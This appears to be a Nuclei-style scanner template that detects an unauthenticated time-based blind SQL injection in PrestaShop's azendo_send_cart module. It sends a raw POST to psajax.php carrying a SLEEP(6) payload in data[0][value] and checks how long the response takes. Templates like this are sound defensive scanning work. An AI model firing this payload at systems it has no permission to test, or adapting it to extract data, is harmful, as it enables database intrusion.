id: azendo-send-cart-sqli

info:
  name: PrestaShop azendo_send_cart - Time-Based Blind SQL Injection
  author: acunetix-export
  severity: critical
  description: |
    Module azendo_send_cart for PrestaShop contains time-based blind SQL injection
    in psajax.php via POST parameter data[0][value]. No authentication required.
  reference:
    - https://security.friendsofpresta.org/
  classification:
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    framework: prestashop
    module: azendo_send_cart
  tags: sqli,prestashop,azendo_send_cart,time-based,blind

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/modules/azendo_send_cart/psajax.php"
    matchers:
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403 && duration <= 3'
        internal: true

  - raw:
      - |
        @timeout: 20s
        POST /modules/azendo_send_cart/psajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        data%5B0%5D%5Bvalue%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+-
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403'
